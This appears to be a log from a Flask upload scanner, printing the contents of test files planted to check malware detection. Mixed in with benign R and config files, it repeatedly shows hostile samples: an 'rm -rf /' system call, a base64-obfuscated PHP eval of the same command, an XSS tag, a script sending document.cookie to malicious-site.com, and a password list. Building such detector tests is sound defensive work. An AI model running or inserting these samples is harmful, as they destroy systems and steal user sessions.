hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:25:42,380 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:25:42,382 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:42,383 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:42,388 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:25:42,396 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:25:42,396 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:25:42,397 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:42,399 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:42,400 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:42,401 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:25:42,406 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:42,407 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:42,413 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:25:42,420 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx
2025-02-22 20:25:42,420 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:25:42,421 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:25:42,424 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:25:42,425 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:25:42,428 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:25:42,429 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:42,430 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:42,439 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:25:42,452 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:25:42,453 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:25:42,455 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:42,456 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:42,458 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:42,459 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:25:42,469 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:42,470 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:42,484 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:25:42,492 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx
2025-02-22 20:25:42,492 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:25:42,493 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:25:42,495 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:25:42,497 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:25:42,499 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:25:42,500 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:42,502 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:42,507 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:25:42,514 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:25:42,514 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:25:42,516 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:42,517 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:42,518 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:42,519 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:25:42,527 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:42,529 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:42,536 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:25:42,544 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx
2025-02-22 20:25:42,544 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:25:42,545 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:42,546 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:42,547 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:42,549 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:42,550 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:42,551 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:25:42,552 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:42,557 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:25:42,565 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:25:42,565 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:25:42,567 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:25:42,568 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:42,569 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:42,570 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:42,572 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:42,573 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:42,574 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:42,575 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:25:42,576 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:42,582 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:25:42,589 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:25:42,589 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:25:42,591 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:25:42,592 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:42,594 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:42,595 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:42,596 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:42,597 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:42,598 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:42,599 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:25:42,600 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:42,606 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:25:42,615 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:25:42,615 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:25:42,616 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:25:42,617 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:42,618 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:42,620 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:42,621 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:42,622 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:42,624 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:42,625 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:25:42,626 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:42,631 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:25:42,639 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:25:42,639 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:25:42,641 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:25:42,642 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:42,645 - 127.0.0.1 - - [22/Feb/2025 20:25:42] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:25:42,650 - 127.0.0.1 - - [22/Feb/2025 20:25:42] "GET / HTTP/1.1" 200 -
2025-02-22 20:31:26,605 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:31:26,610 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:31:26,611 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:31:26,614 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:31:26,615 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:26,616 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

